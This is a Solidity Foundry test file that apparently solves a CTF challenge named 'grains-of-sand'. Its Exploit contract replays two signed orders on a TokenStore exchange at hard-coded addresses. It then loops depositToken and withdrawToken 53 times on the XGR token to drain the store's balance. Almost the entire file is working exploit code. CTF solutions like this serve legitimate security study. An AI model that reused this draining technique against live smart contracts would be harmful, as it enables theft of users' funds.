// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/grains-of-sand/Challenge.sol";
import "forge-std/Test.sol";

interface ITokenStore {
    function deposit() external payable;
    function depositToken(address, uint256) external;
    function withdrawToken(address, uint256) external;
    function trade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s,
        uint256 _amount
    ) external;

    function availableVolume(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) external view returns (uint256);
    function balanceOf(address _token, address _user) external view returns (uint256);
}

contract GrainOfSandTest is Test {
    Challenge public challenge;

    function setUp() public {
        challenge = new Challenge();
    }

    function test_exploitgrainsSand() public {
        Exploit exploit = new Exploit(challenge);
        exploit.exploit{value: 100 ether}();
        assertTrue(challenge.isSolved());
    }
}

contract Exploit {
    Challenge private immutable CHALLENGE;

    IERC20 private immutable XGR = IERC20(0xC937f5027D47250Fa2Df8CbF21F6F88E98817845);
    ITokenStore private immutable TOKENSTORE = ITokenStore(0x1cE7AE555139c5EF5A57CC8d814a867ee6Ee33D8);

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function doTrade(
        address _tokenGet,
        uint256 _amountGet,
        address _tokenGive,
        uint256 _amountGive,
        uint256 _expires,
        uint256 _nonce,
        address _user,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) private {
        uint256 volume = TOKENSTORE.availableVolume(
            _tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s
        );

        TOKENSTORE.trade(_tokenGet, _amountGet, _tokenGive, _amountGive, _expires, _nonce, _user, _v, _r, _s, volume);
    }

    function exploit() external payable {
        TOKENSTORE.deposit{value: address(this).balance}();

        doTrade(
            0x0000000000000000000000000000000000000000,
            84000000000000000,
            0xC937f5027D47250Fa2Df8CbF21F6F88E98817845,
            200000000000,
            108142282,
            470903382,
            0xa219Fb3CfAE449F6b5157c1200652cc13e9c9EA8,
            28,
            0xf164a3e185694dadeb11a9e9e7371929675d2eb2a6e9daa4508e96bc81741018,
            0x314f3b6d5ce7c3f396604e87373fe4fe0a10bef597287d840b942e57595cb29a
        );

        doTrade(
            0x0000000000000000000000000000000000000000,
            42468000000000000,
            0xC937f5027D47250Fa2Df8CbF21F6F88E98817845,
            1000000000000,
            109997981,
            249363390,
            0x6FFacaa9A9c6f8e7CD7D1C6830f9bc2a146cF10C,
            28,
            0x2b80ada8a8d94ed393723df8d1b802e1f05e623830cf117e326b30b1780ae397,
            0x65397616af0ec4d25f828b25497c697c58b3dcc852259eaf7c72ff487ce76e1e
        );

        XGR.approve(address(TOKENSTORE), type(uint256).max);

        uint256 amount = TOKENSTORE.balanceOf(address(XGR), address(this));

        TOKENSTORE.withdrawToken(address(XGR), amount);
        for (uint256 i = 0; i < 53; i++) {
            TOKENSTORE.depositToken(address(XGR), amount);
            TOKENSTORE.withdrawToken(address(XGR), amount);
        }
    }
}
